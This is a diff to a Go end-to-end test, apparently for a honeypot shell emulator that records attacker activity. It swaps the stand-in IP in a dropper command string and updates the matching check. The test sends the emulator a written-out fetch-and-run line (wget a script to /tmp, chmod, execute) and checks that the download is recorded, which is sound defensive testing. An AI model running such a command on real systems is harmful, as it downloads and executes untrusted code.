@@ -81,7 +81,7 @@ func TestEndToEndExecAndRecording(t *testing.T) {
 	if out := exec(t, c, "whoami"); out != "root\n" {
 		t.Errorf("whoami = %q", out)
 	}
-	drop := exec(t, c, "cd /tmp; wget http://185.246.0.1/x.sh -O m.sh; chmod +x m.sh; ./m.sh; ls m.sh")
+	drop := exec(t, c, "cd /tmp; wget http://198.51.100.23/x.sh -O m.sh; chmod +x m.sh; ./m.sh; ls m.sh")
 	if !strings.Contains(drop, "200 OK") || !strings.Contains(drop, "Exec format error") || !strings.Contains(drop, "m.sh") {
 		t.Errorf("dropper = %q", drop)
 	}
@@ -106,7 +106,7 @@ func TestEndToEndExecAndRecording(t *testing.T) {
 				continue
 			}
 			types = append(types, string(e.Type))
-			if e.Type == recorder.EventDownload && strings.Contains(e.URL, "185.246.0.1") {
+			if e.Type == recorder.EventDownload && strings.Contains(e.URL, "198.51.100.23") {
 				sawDownload = true
 			}
 			if e.Type == recorder.EventAuth && e.Accepted != nil && *e.Accepted {
